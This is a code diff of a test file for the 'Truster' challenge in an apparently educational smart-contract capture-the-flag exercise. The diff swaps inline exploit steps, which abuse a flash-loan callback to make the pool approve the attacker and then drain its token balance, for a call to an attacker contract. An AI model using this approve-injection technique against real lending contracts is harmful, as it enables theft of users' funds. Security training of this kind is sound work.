@@ -50,13 +50,9 @@ describe("[Challenge] Truster", function () {
 
   it("Exploit", async function () {
     const LenderAttackerFactory = await ethers.getContractFactory("LenderAttacker");
-    this.lenderAttacker = await LenderAttackerFactory.deploy(attacker.address, this.token.address);
+    this.lenderAttacker = await LenderAttackerFactory.deploy(this.token.address, this.pool.address);
 
-    const poolBalance = await this.token.balanceOf(this.pool.address);
-    const approveCall = web3.eth.abi.encodeFunctionCall(APPROVE_JSON_INTERFACE, [attacker.address, poolBalance]);
-
-    await this.pool.flashLoan(0, attacker.address, this.token.address, approveCall);
-    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, poolBalance);
+    this.lenderAttacker.connect(attacker).attack();
   });
 
   after(async function () {
